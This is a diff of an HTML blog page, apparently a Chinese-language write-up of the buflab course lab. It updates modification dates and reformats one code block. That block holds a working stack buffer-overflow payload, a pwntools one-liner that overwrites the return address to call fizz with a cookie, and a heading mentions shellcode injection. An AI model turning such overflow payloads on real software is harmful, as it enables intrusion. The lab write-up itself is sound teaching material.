@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/buflab/image-20220501233825396.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/buflab/image-20220501233537565.png">
 <meta property="article:published_time" content="2022-05-04T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-07T12:24:35.509Z">
+<meta property="article:modified_time" content="2022-05-10T14:05:44.486Z">
 <meta property="article:author" content="Yogdzewa">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://yogdzewa.github.io/image/buflab/image-20220501205056212.png">
@@ -268,7 +268,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月7日 晚上
+                  不可视境界线最后变动于：2022年5月10日 晚上
                 
               </p>
             
@@ -288,7 +288,7 @@
 
 <h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>要调用fizz函数, 参数要等于<code>cookie = 0x24692446</code>.</p>
 <p>所以gefbuf返回后跳到fizz, 栈底是返回地址, 再往下是第一个参数.</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">python3 -c <span class="hljs-string">&quot;import pwn,sys;sys.stdout.buffer.write(b&#x27;b&#x27;*(0x28+0x4)+pwn.p32(0x08048DAF)+pwn.p32(0)+pwn.p32(0x24692446))&quot;</span> &gt;<span class="hljs-built_in">input</span><br>./bufbomb -u yogdzewa &lt;<span class="hljs-built_in">input</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&quot;import pwn,sys;sys.stdout.buffer.write(b&#x27;b&#x27;*(0x28+0x4)+pwn.p32(0x08048DAF)+pwn.p32(0)+pwn.p32(0x24692446))&quot;</span> &gt;input</span> <br><span class="hljs-meta">$</span><span class="bash"> ./bufbomb -u yogdzewa &lt;input</span><br></code></pre></div></td></tr></table></figure>
 
 <p><img src="../../image/buflab/image-20220501213601163.png" srcset="/img/loading.gif" lazyload alt="image-20220501213601163"></p>
 <h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>shellcode注入, 放到栈上执行, 需要修改一个bss段的全局变量. 如图: <img src="../../image/buflab/image-20220501214313652.png" srcset="/img/loading.gif" lazyload alt="image-20220501214313652" style="zoom:80%;" /></p>
